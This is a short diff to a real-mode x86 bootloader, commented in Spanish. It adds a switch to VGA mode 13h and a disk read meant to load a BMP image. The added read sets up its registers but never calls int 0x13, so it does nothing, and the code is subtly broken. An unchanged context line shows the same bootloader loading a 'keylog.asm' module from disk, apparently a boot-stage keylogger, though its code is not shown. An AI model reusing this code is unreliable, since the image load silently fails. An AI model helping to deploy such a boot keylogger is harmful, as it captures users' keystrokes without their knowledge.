@@ -15,6 +15,20 @@ start:
     mov gs, ax
     mov sp, 0x6ef0      ; Establecer el puntero de pila
     sti                 ; Habilitar interrupciones
+    
+    ; Cambiar a modo gráfico 13h (320x200 píxeles, 256 colores)
+    mov ah, 0x00        ; Función BIOS para cambiar el modo
+    mov al, 0x13        ; Modo gráfico 13h (320x200, 256 colores)
+    int 0x10            ; Llamada BIOS para cambiar al modo gráfico
+
+    ; Cargar la imagen desde el disco (BMP, por ejemplo)
+    mov ah, 0x02        ; Función 0x02: leer sectores del disco
+    mov al, SECTOR_AMOUNT ; Número de sectores a leer (ajusta según el tamaño de la imagen)
+    mov bx, 0x1000      ; Dirección de memoria donde cargar la imagen BMP
+    mov ch, 0           ; Cilindro
+    mov dh, 0           ; Cabeza
+    mov dl, 0           ; Unidad (disco 0)
+    mov cl, 3           ; Sector de inicio (ajusta si es necesario)
 
     ; Cargar keylog.asm desde el disco
     mov ah, 0x02        ; Función 0x02: leer sectores del disco
